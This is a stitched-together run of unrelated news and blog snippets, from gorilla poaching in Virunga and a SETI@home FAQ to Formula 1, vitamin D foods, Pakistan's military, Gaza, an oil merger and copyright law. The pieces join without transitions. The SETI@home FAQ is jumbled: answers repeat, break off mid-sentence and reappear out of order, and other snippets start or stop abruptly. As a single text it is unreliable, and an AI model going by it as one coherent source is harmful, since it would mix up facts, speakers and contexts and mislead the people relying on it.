" Most of the park officials risk their lives to protect the park , [ but ] there are some people in the park service who are in collaboration with the military and the poachers , " he said .
Shortly after Ngobobo posted an article on WildlifeDirect 's blog on the illegal charcoal trade , he was arrested and placed in the custody of a military tribunal in Goma for two days on charges of negligence .
According to court documents , Ngobobo has been accused of neglect in the death of a Chinese tourist who fell into a nearby volcano .
He is also charged with furnishing false information about the charcoal trade and obstructing the investigation into the gorilla killings .
Ngobobo says the charges are politically motivated , brought against him by officials involved in the charcoal trade who want to see him removed .
In a telephone interview with National Geographic News , Ngobobo 's former supervisor , Honore Mashagiru , dismissed those allegations .
" People say things , but where 's the proof ? " he said .
" It 's not true .
It 's not true . "
Mashagiru said Ngobobo has become the target of the charcoal traders because " he has not communicated well with the community about the issue . "
Ngobobo is still facing court charges and must report daily to the tribunal .
Meanwhile , Norbert Mushenzi , a park service director who has been in charge of the northern sector of Virunga , has been assigned to Ngobobo 's post to protect the gorillas .
In recent days , Mushenzi , who also has a history of speaking out against the charcoal traders , and his rangers have detained about 50 women whom they caught making charcoal in the park .
" Act of Sabotage "
Both Ngobobo and de Merode are convinced that the execution of the gorillas last month is linked to the charcoal trade .
" None of the gorillas was cut up , and there was a baby still on one of the mothers , " de Merode said .
" In the history of gorilla conservation , there 's never been incidents like these where a group is attacked not for meat or baby gorillas . "
A baby gorilla can fetch thousands of dollars on the illegal wildlife market , he added .
The mass execution was also identical to the killing of a female gorilla 8.7 miles ( 14 kilometers ) away on June 8 .
" In terms of the whole build - up over the last year , it 's a very strong case for it being planned and being vindictive , " de Merode said .
" We believe this was an act of sabotage by the people in the charcoal business who want to see the gorillas dead . "
De Merode says the Rwandan authorities should seek to clamp down on the charcoal trade , which he believes would lead to greater protection for the mountain gorillas .

Category : Questions about SETI@home
Q . Do I need permission from my employer to run SETI@home on computers at work ?
A. Yes !
Of course !
Q. Does SETI@home really cost that much to run ?
A . The cost of running SETI@home is not zero .
When a computer performs calculations , it draws more power than it does when it is idle .
A typical desktop machine might draw about 60 watts more when active than when idle which is about the same as an incandescent light bulb .
If run 24/7 , that machine will consume an additional 525 kilowatt hours ( kW*h ) in a year .
At an average cost of $ 0.12 per kW*h , that 's $ 63.11 per year .
That 's pretty small compared to the cost of your computer , and maybe about the same as your monthly cable bill , but it 's pretty big compared to the cost of can of soup .
At that rate , you could spend $ 1.6 M on power by running 25,000 computers for a year , or 5000 computers for 5 years .
This is in addition to the power usage of an idle machine , which can also exceed 60 watts .
If a school district really wants to save power and money it should implement a policy to turn off computers at night .
If SETI@home cost them $ 1.6 M as they state , they would have saved $ 3.2 M if such a policy had been implemented .
Q. Does SETI@home damage your processor ?
A. I am not aware of any study that indicates that fully utilizing a CPU 's processing power for a long period of time will cause it to fail sooner than it normally would , provided that the CPU is kept in the normal temperature range for operation .
A CPU 's temperature us usually controlled by a heat - sink and fan .
If the heat sink or fan fails a CPU can be damaged whether SETI@home is running or not .
Most desktop computers emit an alarm sound if the CPU fan fails .
Most laptops and some desktops have a thermal protection system that slows down the processor if it overheats .
If your machine is running slowly , check the fan .
Q. Does BOINC or SETI@home interfere with electronic whiteboards or their software .
A. Nobody has reported such a problem .
In the past several days I have had many teachers inform me that SETI@home works quite when on machines that also control electronic whiteboards .
I think this could fall into the next category of " Bad Reporting . "
Many articles said that SETI@home was discovered on these computers while looking for the reason that electronic whiteboards were shutting down after periods of inactivity .
I did n't see any that indicated that SETI@home was the cause of those shutdowns .
Most likely the whiteboard device drivers or their control software were configured in a way that allowed the computer to shut off their power after a period of inactivity .
It is my understanding that there are also a lot of inferior electronic whiteboards that have been sold to school districts that are required to accept the lowest bid when purchasing equipment .
That is also a possibility .
Q. Did SETI@home slow down other software as was reported ?
A. Probably not .
If BOINC is configured not to run applications while the computer is in use , it should not cause a slowdown of other software .
If there 's one thing IT personnel like , it 's blaming slow computers on viruses , spyware , or " too much stuff on the hard disk . "
That might be the case , but those are just a case of poor computer maintenance by the IT personnel which is the most common cause of slow school or work computers .
Q. Does BOINC and SETI@home prevent you from installing a firewall ?
A. No. BOINC and SETI@home do not require that a computer not have a firewall , nor does it require holes in your firewall settings .
BOINC and SETI@home use the same IP port used by web browsers .
If your firewall allows you to use a web browser , you can run SETI@home .
Remote access to BOINC ( which allows you to control the BOINC client running on one computer from another ) does require a single IP port to be opened , but this feature is disabled by default .
The district administrator , Dr. Birdwell , is mistaken if she believes that BOINC is incompatible with firewalls .
Q. Dr. Birdwell says " You ca n't just press a button " to uninstall BOINC and SETI@home .
Is that true ?
A. It depends .
Do you mean literally true ?
Then yes , most computers ship without an physical button labeled " Uninstall BOINC . "
To uninstall BOINC , you do the same thing you would do to to uninstall any program .
On windows that means click the " Control Panel " icon in the Start Menu .
Then double click on " Add or Remove Programs . "
Then select " BOINC " and click the " Remove " button .
That 's five mouse clicks , but the entire process takes less than a minute to accomplish .
Not exactly a button push , but I would n't place it in the " difficult " category .
Q. Does running BOINC or SETI@home make your computer susceptible to viruses ?
A . If you download official BOINC binaries through
Category : Just Plain Bad Reporting
Q. I saw an article that said that SETI@home caused $ 1.6 M in damage to computers a school district .
Is that true ?
No .
In that article the reporter either mistook the legal concept of " damages " with actual physical damage , or was such a poor writer that they could n't explain the difference .
Category : Questions We Could n't Possibly Answer
Q. Did Niesluchowski have permission from a prior administrator to run SETI@home or to take computers home from work ?
A. I do n't know .
How could I know that ?
Q. Did the school district confiscate NEZ 's family computers along with the district computers ?
A. Beats me .
Since I do n't see it in the articles , but in comments to the articles posted by readers , I doubt that you can lend it much credence .
Category : My Personal Opinions ( not those of my employer , of the SETI@home project , or of its participants . )
Q . What do you think about the district administrator , Dr. Denise Birdwell 's comment that " We support educational research and we would have supported cancer research but we however as an educational institutional do not support the search for E.T. " ?
A. I think that Dr. Birdwell 's comment is insulting to me , to the University of California , and to the millions of people who have run SETI@home in the past 10 years .
Dr. Birdwell is ill informed about SETI , SETI@home and volunteer computing .
I think its likely the cancer research she claims to support would probably not be happening if SETI@home had not popularized volunteer computing .
I would point out to Dr. Birdwell that the University of California is a world renowned educational institution , and that regardless of her opinions , SETI@home is still the largest volunteer computing project on the planet .
I will also gladly point out that the NASA Exobiology program and the National Science Foundation Astronomy division apparently do not agree with her assessment .
That said , I 'm not at all upset about the bad press she is sending our way .
There are a lot of school districts in the world , and she only runs one .
However , I do wonder whether the Higley School Board agrees with the opinions she espouses so loudly .
@SETIEric
I 've been getting a lot of questions and comments about the forced resignation of an IT administrator in the Higley School District in Arizona .
There 's a lot of misinformation flying around , mostly due to poor reporting .
First lets start with the facts we know : NEZ ( Brad Niesluchowski ) was an IT administrator at Higley school district .
He allegedly installed and ran BOINC and attached to the SETI@home project .
The district alleges damages of $ 1.2 M to $ 1.6 M because of the use of SETI@home both due to wear and tear on the processors and electricity usage .
Niesluchowski claims that the district administrator has a personal vendetta against him .
A. Yes !
Of course !
We 've been saying that for 10 years , and despite what some bloggers have said , Niesluchowski was n't the first person to lose his job over this .
The first time was many years ago .
A . The cost of running SETI@home is not zero .
When a computer performs calculations , it draws more power than it does when it is idle .
A typical desktop machine might draw about 60 watts more when active than when idle which is about the same as an incandescent light bulb .

If you download official BOINC binaries through boinc .
berkeley.edu and attach only to reputable projects there is very little danger of getting a virus from BOINC or the project .
In fact we are not aware of any cases of a computer getting a virus through BOINC or SETI@home in our 10 year history .
You are far safer running BOINC than you are reading your email .
No .

Quantum Cryptography Cracked
Impressive :
This presentation will show the first experimental implementation of an eavesdropper for quantum cryptosystem .
Although quantum cryptography has been proven unconditionally secure , by exploiting physical imperfections ( detector vulnerability ) we have successfully built an intercept - resend attack and demonstrated eavesdropping under realistic conditions on an installed quantum key distribution line .
The actual eavesdropping hardware we have built will be shown during the conference .
While I am very interested in quantum cryptography , I have never been optimistic about its practicality .
And it ’s always interesting to see provably secure cryptosystems broken .

Fernando Alonso says he is absolutely sure he will finish his Formula 1 career at the Ferrari team , despite having just joined the Maranello squad .
The two - time world champion has joined Ferrari to replace Finn Kimi Raikkonen as Felipe Massa 's team - mate from this year , having agreed a three - year contract .
Although the Spaniard will not be able to test his new car until next month , he says he is already feeling at home , having been working with the team in his visits to the factory .
" We have had contact , especially with my race engineer and the technicians of the team , " Alonso told reporters at Ferrari 's media event in the Dolomites .
" We kept exchanging emails and phone calls and I 'm always updated about the development of the car so we can be perfectly ready when the tests start in February .
" We have worked well .
From day one I found myself at home at the team .
There is like a family feeling from the start .
When I went to Maranello I saw the passion of the people that are working at Ferrari .
It is something unique in Formula 1 .
When asked if he was sure he will finish his career at Ferrari , he said : " I 'm 100 per cent sure . "
" For any driver , coming to Ferrari is the best thing you can do in your career , " Alonso added .
" It 's almost impossible to find the motivation to race for another team after racing for Ferrari , because you will never find the same environment or have the same feeling due to its history .
" It 's a legendary team represented by the prancing horse .
Of course I feel calm now because I 've achieved one of my goals . "
Alonso , the 2005 and 2006 champion , admitted it will be difficult for him to win the title in his first year with Ferrari , and reckons he will need a few races before he 's fully integrated at the team .
" Of course it 's difficult , " he said .
" I know I 'm going to have to adapt very quickly to the car .
" I only have seven , eight days of testing in February and I know that perhaps in the first three , four races we will not be 100 per cent adjusted to the car and to the team .
" But from race three or four I 'm sure we will be able to see the best version of Alonso as well as the best version of Ferrari . "
And the Spanish driver is well aware that emulating the success Michael Schumacher enjoyed with Ferrari is also a tall order .
" You always want to win , but I think seven titles is something that is nearly impossible to repeat these days , " he said .
" I think Formula 1 now is so close and the rules are very strict .
" The competition now is about two or three tenths , so winning five championships in a row , or four like Michael did , is something very difficult to repeat . "
Alonso claimed he now feels much more ready to tackle the Ferrari challenge than a few years ago .
" I do n't know what Kimi gave to the team , " he said when asked what he can bring that Raikkonen did n't .
" I'm here to give the team all my professionality , to give all my skills to drive the car , and outside of the car I know the driver must continue to work with the engineers as well for the development of the car .
" Also to establish a good relationship with the fans , with the media , and so I think I 'm more prepared now than when I won my championships with Renault , and also when I was with McLaren .
" Today I feel much more ready , much more prepared to tackle this challenge , which is not easy because Ferrari is known throughout the world and many expect a lot from you around the world .
" It could be in Japan , in Europe , in India , because Ferrari is known everywhere , and so your results have a big impact on the media and we know we have to win . "
( CNN ) -- Forget spray - painting crude symbols under the cover of night .
Colorful knitters armed with needles and skeins of yarn are unleashing their own brand of colorful guerrilla art to breathe new creativity and spirit into the machismo of urban art .
Denise Litchfield of Sydney , Australia , is one of these global artists .
She helped cover an old men's restroom with yellow yarn designs , and then shared photos of the display with CNN iReport .
She says she loves guerrilla knitting because it 's so unique , different and unmasculine .
" It 's a response to the growing street art world to make a distinctly feminine statement in urban art in a way that is far less harmful to the surroundings .
As in , it does not need solvents or cleansers to remove .
It 's stitched on , and if you do n't like it , you unpick it . "
Tree trunks , door handles and street signs are fair game .
Projects as large as buses and buildings have been undertaken as a response to garden - variety shenanigans .
The artists seek to bring their own feminine flair while beautifying their surroundings in a nondamaging way .
Litchfield and the rest of the restroom - stitching whizzes were helping to create an appropriately colored project called " The Knitted Convenience , " which they put up in August at a historic toilet facility in Sydney 's Taylor Square .
Many of the knitters were women in colorful knitted wigs , but there were some men there , too .
See the installation take shape
The city 's historic public toilets hold a special place in feminists ' hearts .
The women 's restroom in Taylor Square was one of the first female public toilets in the area and symbolizes growing female independence and power in Sydney .
This makes the restrooms a target for activists and even urban knitters .
Part protest , part artwork , part cultural zeitgeist , the exhibition is an ironic take on feminist history and a way of exploring themes of gender and sexual orientation .
More recently , Litchfield created knitted projects at the Viva La Gong Festival in November .
She knitted objects in the area , to the delight of locals , and covered an entire coily sculpture in multicolored weave .
The projects benefit the community , she says , and she documents her work and other projects on her personal blog .
Not too far away , in New Zealand , iReporter Mico Santos found graffiti artists from OutdoorKnit creating knitted hearts and other loving imagery near a barren lot surrounded by industrial scenery .
Watch the artists put up the hearts
Santos ' footage shows the group walking up to chain - link fences and weaving the shapes onto the metal openings .
The artists told him they felt a little bit like grandmas , but they enjoyed doing something different .
Even babies were brought to the scene of their project .
Texas artist Magda Sayeg says the beauty of knitting is it 's friendly , welcoming and does n't destroy property .
Sayeg , considered the mother of urban knitting and founder of the Knitta Please group , says ruining others ' things is " probably the wimpiest thing a graffiti artist can do . "
She prefers artwork done out in the open , where others can see it .
She 's not even a fan of writing on bathroom walls .
Too much privacy .
" There 's nothing badass about that . "
Sayeg started doing small projects around her , then began larger ones .
She 's installed knitting projects covering structures and a bus in Mexico City , Mexico , in November 2008 .
She 's been around the United States and to countries including Italy and Australia .
Share your photos of street art
Lots of graffiti can be done without a spray can , Sayeg says .
She 's seen examples of artists who make their work by cleaning spaces to create outlines .
Others grow patterned cultivations of plants and moss .
She says she 's fascinated by graffiti as a whole .
" Graffiti is becoming less hated .
There 's more of a curiosity that people have for it . "
Sayeg is working on a book now and asking people to send pictures of their projects .
She says she started urban knitting for selfish purposes and to beautify her environment .
In the end , she says , street art is obvious and accessible to anyone .
" It 's art that anybody can see .
It 's not just people that visit the galleries and museums .
It 's people that deliver your mail that are going to see your art . "
What 's taken place in the year since Obama won the presidency has turned out to be one of the most dramatic political about - faces in our history .
Elected in the midst of a crushing economic crisis brought on by a decade of orgiastic deregulation and unchecked greed , Obama had a clear mandate to rein in Wall Street and remake the entire structure of the American economy .
What he did instead was ship even his most marginally progressive campaign advisers off to various bureaucratic Siberias , while packing the key economic positions in his White House with the very people who caused the crisis in the first place .
This new team of bubble - fattened ex-bankers and laissez - faire intellectuals then proceeded to sell us all out , instituting a massive , trickle - up bailout and systematically gutting regulatory reform from the inside .
Taibbi's article is long , but is a must read .
When I was finished , I was physically ill .
Update :
As many posters have pointed out , this was not really a diary because it did not have enough original content .
True .
I was in a hurry to get this out , and had to leave quickly .
Guilty as charged , and I apologize .
What struck me about this article was the fact that Obama tossed out the liberals who were a very critical part of his campaign once he became elected , in favor of the Rubens , Geithners , etc .
He has now surrounded himself with the very people at the heart of the financial mess we 're in now .
Also troubling to me personally regarding Obama 's financial appointments is that - as an entity - they may have given Bob Rubin perhaps the most influence any one Wall Street insider has ever had in government .
And Bob Rubin is no friend of liberals .
Obama 's Big Sellout
Although we can find many foods in the supermarket that have been fortified with a synthetic form of vitamin D , there are only a select number of foods containing D in them naturally .
Normally , our body takes in vitamin D in the form of sun-synthesis through the skin .
But in our modern times , where many of us spend countless hours inside houses , cars and shopping malls , our actual exposure to the sun is limited .
This fact may be a principle cause of many ailments , including depression .
For this reason , it is extremely important to have a diet high in vitamin D or take a D supplement .
Boost your vitamin D with these 10 foods
This is my ‘ List of Foods Containing Vitamin D’ , as well as some of the great potential benefits of the vitamin .
( In no particular order )
1. Shiitake & button mushrooms :
Surprisingly , the dried versions of shiitake mushrooms are high in vitamin D .
This may be due to the fact that these mushrooms are adept at sucking up sunlight .
[ Editor ’s Note : Keep in mind the vitamin D found in mushrooms is the D2 version , and not D3 .
That means it does n’t raise the blood levels of D as efficiently .
So it should’t be relied upon as your sole source of the vitamin . ]
Shiitake is also rich in B Vitamins like B1 & B2 .
Make sure that you find mushrooms that have been dried in the sun , not by some artificial means , in order to extract the benefits of high vitamin D content .
2. Mackerel :
A small , 3 ½ ounce portion of this Omega - 3 rich fish will give you 90 % of the recommended daily amount .
Currently , the FDA recommends that we eat more of these oily fishes to infuse our bodies with the vitamins and omega - 3 essential fatty acids ( EFA ’s ) that our body cannot produce on its own .
3. Sockeye salmon :
A small 3 ½ ounces portion of cooked salmon will give you 90 percent of the Dietary Reference Intake for D.
Make sure to purchase salmon that has been caught from the wild , if not , then sustainably farmed .
Salmon eat zooplankton , an excellent source of the important vitamin .
4. Herring :
Fish like herring are so high in vitamin D because they are the part of our food chain that thrive on plankton , which is chocked full of the vitamin .
5. Sardines :
Sardines are one of the best foods containing Vitamin D .
One small tin can of sardines will provide you with approximately 70 percent of your daily needs .
These tiny canned fish are also a great source for Vitamin B12 , Omega - 3 Fatty Acids , protein and selenium .
6. Catfish :
Again , another fish that makes a habit of feeding on plankton , catfish are constantly taking in minuscule sea life that create vitamin D from sunlight .
7. Tuna fish :
Eat 3 ounces of tuna daily for 50 % of your Vitamin D needs .
Fresh , wild - caught tuna is the most nutritious .
Remember , eating oily fish can also lubricate the body with “ good fats , ” providing a host of health benefits to your body , like better memory and brain function .
8 . Cod liver oil :
If you can stomach the strong aroma , this oil is super - rich in sunlight vitamin D .
This marvelously golden , yet terrible - tasting oil , is also rich in omega - 3 fatty acids .
Incorporating this oil into your diet will help you increase your bones ability to stay strong and healthy .
Because of its high Vitamin D content , cod liver oil has also been shown to prevent osteoporosis in adult , improve brain function and optimize the functioning of the nervous system .
What is more , the oil holds 10,000 IUs of vitamin D. One tablespoon of the oil provides more than enough D for the day .
9 . Eggs :
Eggs are another food containing vitamin D in small amounts .
Eating one egg will provide you with approximately 10 % of your daily needs .
I would personally recommend to eat free - range eggs from a local farm , if possible .
10 . Sunshine :
Okay , we know it ’s not a food , but daily “ doses ” of sunshine can seriously up your vitamin D intake .
In fact , this vitamin has actually been referred to as the sunshine vitamin .
Light hitting the skin from the sun ’s rays stimulates the production of this vitamin and hormone .
This is great news for those of us that can take a sun-bath daily .
But for those of us in colder , cloudier climates , we can up our intake from the foods we eat .
This could explain why Native Inuit people in Alaska ate so much fish !
There are many reasons to stock up on foods containing vitamin D. Health benefits of the vitamin include :
The prevention of chronic diseases such as many forms of cancer , osteoporosis , diabetes , heart disease , hypertension .
The protection and lubrication of your bones , teeth and hair .
The regulation of cellular growth and healthy cell activity
Overall reduction of the inflammatory response , a condition known to cause many chronic diseases , from cancer to diabetes to obesity .
Protection against adult osteoporosis
Reduction in the risk of breast cancer in perimenopausal women
Significant reduction in the occurrence of prostate cancer in African - American men
As I mentioned above , if you are a vegetarian or do n’t eat fish , you can still get the same benefits by taking a vitamin D supplement , or make sure to get plenty of sun on a daily basis .

You can suggest words while entering text into many applications by simply hitting the Option + Escape keys while typing in most OS X apps .
This is so useful for writing .
For example , if you ca n’t remember how to spell a word but remember that it starts with a V ?
No problem , type V and then hit Escape and a list of words will come up that start with V …
The screenshot below demonstrates how this is used for word suggestion functionality , showing the feature in action within the TextEdit app of Mac OS X .
Try it out yourself , start typing a word , then hit Escape ( some older Macs require Option + Escape to summon the suggestion menu )
This works in many Mac OS X apps and just about every version of OS X , though it ’s not supported in every single app that is built for the Mac .
It even works pre-autocorrect , so older versions of Mac OS X without the text correction feature available to them can use this instead to get suggestions offered by the built - in dictionary and use that as a corrective mechanism instead .
Speaking of autocorrect , because this works without the feature , if you decide to turn that off for some reason , you can still use this for assistance when spelling words !
You really should try it out yourself to get an idea of how it works , so launch TextEdit or another app that you like to write in and give it a test , you ’ll find it ’s quite useful !
Why Pakistan will not mount new attacks on militants
Pakistan 's military thinks it has strong reasons not to attack the militants
With its announcement that it will launch no new offensives against the Taliban in 2010 , Pakistan 's army appears to have opened a new innings in its favourite game with the West , says the BBC's Syed Shoaib Hasan in Islamabad .
For the United States , the statement by the Pakistan army could not have come at a worse time .
Its main intelligence agency , the CIA , is still coming to terms with the death of seven personnel in a suicide attack in Afghanistan by an al - Qaeda " double agent " .
That attack , the worst suffered by the agency in four decades , was apparently planned and carried out by Taliban militants in Pakistan 's tribal areas .
Under pressure from the US , the Pakistan army launched an operation there in the main Taliban stronghold of South Waziristan in November 2009 .
The army has since been able to secure that territory and push out the militants .
Hillary Clinton wants Pakistan to target militants in Baluchistan
While some have been captured , most senior Taliban and al - Qaeda leaders have fled the region .
Intelligence officials say they have now taken refuge either in other nearby tribal regions or the neighbouring Balochistan province .
Mission impossible Top US officials , including Secretary of State Hillary Clinton , have been calling for the military to go after the militants in these regions .
All this comes at a time when Pakistan 's government is already under a great deal of domestic criticism .
This is mainly due to increased missile strikes by the US targeting Taliban and al - Qaeda leaders in the tribal areas .
These have turned a sometimes ambivalent tribal population against the Pakistan military .
Analysts say the tribesmen see the strikes , which have claimed more lives of civilians than of militants , as contiguous with the military operation .
But US officials have continued to press for more action , painting doomsday scenarios for Pakistan .
The latest such warning comes from US Defence Secretary Robert Gates , who said in India that al - Qaeda was planning to carry out attacks to provoke war with Pakistan .
But the Pakistan military appears to have its own views on the subject , and their say is likely to count the most .
Pakistani troops hold their positions on a hill top in South Waziristan .
Their latest decision is likely to sends shivers through all Western capitals which have a stake in Afghanistan .
For Washington , in particular , the military 's U - turn will have far - reaching consequences .
Without Pakistani soldiers pressurising the Taliban in the tribal areas , it will be mission impossible for US forces in Afghanistan .
Diplomatic wrangling Even with the additional 40,000 troops , it will not be possible to contain the insurgents .
With 2010 already being called a defining moment in the current conflict , the military has risked the all - out ire of the US with its decision .
But it appears to have thought out the move , given that it has gone public at a time when the US defence secretary is in Pakistan .
The military believes it has strong reasons not to move against the militants .
Many senior military officials have been angered by what they see are recent moves by the US and the UK to expand India 's involvement in Afghanistan .
They see this as being specifically targeted against Pakistani interests .
There is also the matter of promised US aid to Pakistan , most of which has been delayed due to diplomatic wrangling .
US officials say much of the aid has been held up because of delays in processing visas for officials attached to the projects .
Without Pakistani offensives , will it be mission impossible for US forces ?
But Pakistani intelligence officials say that many of these officials actually end up involved in activities " beyond their charter of duties " .
In common parlance , its means the officials are seen as spies .
Extremely unhappy
The military 's decision has also put the Pakistan government , with which it has been at odds of late , in an embarrassing position .
The military 's unhappiness at the government stems from what it sees as its pandering to US demands at every turn .
One example which intelligence officials quote at liberty , is the manner in which US special forces personnel are allowed to enter and move around Pakistan without being documented by immigration .
Officials say the military is extremely unhappy with the interior ministry on this count .
The shaky PPP - led government , for its part , is too busy rolling from one political crisis to another to really take this matter in hand .
On a more direct note , Pakistan 's military has also been demanding that the US give it more advanced helicopters and transfer its drone technology .
They say as the frontline state against the Taliban , such equipment is needed for greater success .
The US has , however , rejected these demands so far .

Aid agencies say the world community must put more pressure on Israel
Aid agencies have strongly criticised the international community for failing to help bring an end to Israel 's blockade of Gaza .
The charities made the accusation in a report published just ahead of the anniversary of Israel 's offensive in the Gaza Strip .
The aid agencies condemn not just Israel , but the world community .
In the words of Oxfam 's director , Jeremy Hobbs , " world powers have failed and betrayed Gaza 's ordinary citizens " .
The charities call for more pressure to be exerted on Israel to end what they describe as its illegal collective punishment of Gazans .
Israel imposed a tightened blockade after the Islamist Hamas movement seized power two - and - a - half years ago .
That was bad enough , say the aid agencies .
Matters became that much worse after the destruction caused by the Israeli offensive in Gaza earlier this year .
The report points to an acute shortage , in particular , of building materials .
A spokesman for the Israeli prime minister told the BBC that Israel remains committed to humanitarian supplies of food , medicine and power .
But he said that sanctions will remain in place as long as Hamas is committed to destroying Israel and killing Israelis .
Over the last decade , a handful of the nation ’s small energy companies pulled off a coup .
Right under the noses of the industry ’s biggest players , they discovered huge amounts of natural gas in fields stretching from Texas to Pennsylvania .
One of these companies , XTO Energy , grew almost unnoticed into the nation ’s second - largest gas producer , amassing a substantial portfolio of gas fields , and developing expertise in the complex technology needed to extract the gas from beds of a dark rock called shale .
Now , the biggest energy companies are paying attention .
Exxon Mobil , the world ’s largest publicly traded oil and gas producer , said Monday that it had agreed to buy XTO in an all - stock deal valued at $ 31 billion , the biggest oil and gas deal in four years .
The purchase allows Exxon to expand in shale gas , an area that has seen tremendous growth , and increase its gas resources by 45 trillion cubic feet , roughly equivalent to two years of domestic demand .
The transaction is the company ’s biggest since the $ 81 billion merger of Exxon and Mobil in 1999 .

Yeah .
I know what you ’re thinking .
What kind of horrible people would schedule their wedding on Super Bowl Sunday ?
Who the hell gets married in the middle of Wisconsin in February anyway ?
People who hate football , that ’s who .
I do n’t know who those people are in that picture , but they look like they ’re having a good time .
I bet they did n’t get married during football season .
Well , I love my sister , so I agreed to be one of her groomsmen on February 7 , 2010 .
Her fiancé seems like a nice enough guy , even though he ’s a vegetarian .
I ’m fairly certain he gets manicures on a regular basis , and he obviously hates football .
These three things are enough to make me want to bitch - slap him , but since we ’re going to be related in like two months , I ’ll have to curb my violent urges and continue to do that stupid knuckle fist - pump explosion thing he calls a greeting when we see each other .
This is the only scenario I can think of that is worse than having your wedding on deer hunting opener weekend .
It ’s barbaric .
Down to this wedding business .
It ’d be one thing if the guys were all dressed as linebackers and the bridesmaids were dolled up as cheerleaders before we all watched the big game .
In fact , if I ever get married , that ’s probably how it will go down .
But no , I have to rent a monkey suit and show up at the church at 3 pm just like everybody else .
Then I have to stand , kneel , stand , kneel , stand , kneel for two hours and wait another hour just to eat tofu stir fry and watch people do the electric slide .
By that time , the Super Bowl pre-game show should be starting .
WHAT AM I SUPPOSED TO DO HERE PEOPLE ?
I ’ve come up with 10 pretty bad excuses , but I might need your help to cushion the blow , especially if my Minnesota Vikes make it to the Big Show .
Which they will .
10 . I have diarrhea .
First of all , no one is going to think I ’m lying .
Who would lie about that ?
Second , no one wants to touch , let alone be near anyone with the squirts .
9 . I have to return my tux .
Do places rent tuxes by the hour ?
8 . I have the swine flu .
On the same lines as # 10 , no one wants any part of that .
7 . I have a bomb .
This one might be a little risky …
I do n’t think they show the Super Bowl in jail .
6 . I have to do my taxes .
In all honesty , it might actually take me two months to get them done .
5 . I have jury duty .
Hey , no one wants to be held in contempt .
4 . I ’ve been drafted by the army and have to leave for Iraq immediately .
This one could get tricky when I show up at Easter dinner .
3 . I ’ve been car - jacked on the way to the reception .
What ’s that noise ?
Oh , the assailants are holding me hostage at a sports bar .
2. I have a manicure appointment .
My new bother - in - law might understand this excuse .
1. I ’m gay .
My parents would disown me , but I ’d definitely be able to watch the Super Bowl .
Any ideas ?

An Emirati court has acquitted the President 's brother of charges of torturing an Afghan but convicted five co-defendants , including two Americans , his lawyer said .
The court in the United Arab Emirates ( UAE ) acquitted Sheikh Issa bin Zayed al - Nahayan " after establishing he was not responsible " for the torture of the Afghan merchant in 2004 , lawyer Habib al - Mulla said .
Acquitted ... Sheikh Issa bin Zayed al - Nahayan Credit: AFP
" The court accepted our defence that the sheikh was under the influence of drugs [ medicine ] that left him unaware of his actions " , the lawyer said .
However , the court in the oasis city of Al - Ain ordered two co-defendants to pay a " temporary compensation " of 10,000 dirhams ( $ 3000 ) to the Afghan , who can file a new lawsuit to claim full compensation , the lawyer said .
Google , copyright , and our future .
In early 2002 , the filmmaker Grace Guggenheim -- the daughter of the late Charles Guggenheim , one of America ’s greatest documentarians , and the sister of the filmmaker Davis Guggenheim , who made An Inconvenient Truth - decided to do something that might strike most of us as common sense .
Her father had directed or produced more than a hundred documentaries .
Some of these were quite famous ( Nine from Little Rock ) .
Some were well - known even if not known to be by him ( Monument to a Dream , the film that plays at the St. Louis arch ) .
Some were forgotten but incredibly important for understanding American history in the twentieth century ( A Time for Justice ) .
And some were just remarkably beautiful ( D - Day Remembered ) .
So , as curator of his work , Grace Guggenheim decided to remaster the collection and make it all available on DVD , which was then the emerging platform for film .
Her project faced two challenges , one obvious , one not .
The obvious challenge was technical : gathering fifty years of film and restoring it digitally .
The non-obvious challenge was legal : clearing the rights to move this creative work onto this new platform for distribution .
Most people might be puzzled about just why there would be any legal issue with a child restoring her father ’s life ’s work .
After all , when we decide to repaint our grandfather ’s old desk , or sell it to a neighbor , or use it as a workbench or a kitchen table , no one thinks to call a lawyer first .
But the property that Grace Guggenheim curates is of a special kind .
It is protected by copyright law .
Documentaries in particular are property of a special kind .
The copyright and contract claims that burden these compilations of creativity are impossibly complex .
The reason is not hard to see .
A part of it is the ordinary complexity of copyright in any film .
A film is made up of many different creative elements -- music , plot , characters , images , and so on .
Once the film is made , any effort at remaking it -- moving it to DVD , for example -- could require clearing permissions for each of these original elements .
But documentaries add another layer of complexity to this already healthy thicket , as they typically also include quotations , in the sense of film clips .
So just as a book about Franklin Delano Roosevelt by Jonathan Alter might have quotes from famous people talking about its subject , a film about civil rights produced in the 1960s would include quotations -- clips from news stations -- from famous people of the time talking about the issue of the day .
Unlike a book , however , these quotations are in film -- typically , news footage from CBS or NBC .
Whenever a documentarian wanted to include these clips in his film , he would ask CBS or NBC for permission .
Most of the time , at least for a healthy fee , CBS and NBC and everyone else was happy to give permission so as to be included .
Sometimes they wanted to see first just how the clip would be used .
Sometimes they would veto a particular use in a particular context .
But in the main there was a healthy market for securing permission to quote .
The lawyers flocked to this market for permission .
( That ’s their nature . )
They drafted agreements to define the rights that the quoter would get .
I suspect that most filmmakers never thought for a second about how odd this “ permission to quote ” was .
After all , does an author need to get permission from The New York Times when she quotes an article in a book about the Depression ?
Indeed , does anyone need permission from anyone when quoting public statements , at least in a work talking about those statements ?
Ordinarily , one would think that this sort of “ use ” is “ fair , ” under the rules of copyright at least .
But most documentarians -- indeed , most filmmakers -- did not care to work through the complexity and the uncertainty of a doctrine such as “ fair use . ”
Instead they agreed to licenses that govern -- exclusively , as they typically asserted -- the rights to use the quotes that were in the film .
So , for example , the license would insist that the only right to use the film came from the license itself ( not fair use ) .
And it would then specify the scope and term of the right -- five years , North American distribution , for educational use .
Perhaps a dozen of these specialized guns were made in Nazi Germany .
They fired either a .32 caliber or .22 rimfire cartridge and had a four - round magazine .
At the link , you 'll find a copy of a short article from a 1954 issue of American Rifleman about two such guns that had come into the possession of the then - Governor of Alabama .

If you live in the UK , be proud - you 're a citizen of one of the world 's most advanced countries when it comes to digital communications .
You 're more likely to have switched to digital television than anyone else , you enjoy some of the highest levels of broadband availability in the world while paying the lowest prices to use mobile phones and the internet .
That 's the picture painted by the media regulator Ofcom , whose annual compendium of international media and communications habits is full of fascinating titbits , like a rich Christmas pudding .
Did you know for instance that the average British viewer watches three hours and 45 minutes of television every day , and that we 've seen a bigger increase in TV viewing than any other country ?
Mind you , we still have some way to go before we catch up with the Americans , who lead the world with four hours and 37 minutes in front of the box each day .
Then there 's the fact that the British are the second biggest texters in the world , sending 83 billion last year .
Mind you , I was surprised to learn that the USA leads the world in texting - I was under the impression that Americans were a little backwards in all things mobile .
Maybe they 're now falling in love with SMS just as the rest of the world moves on to the mobile web .
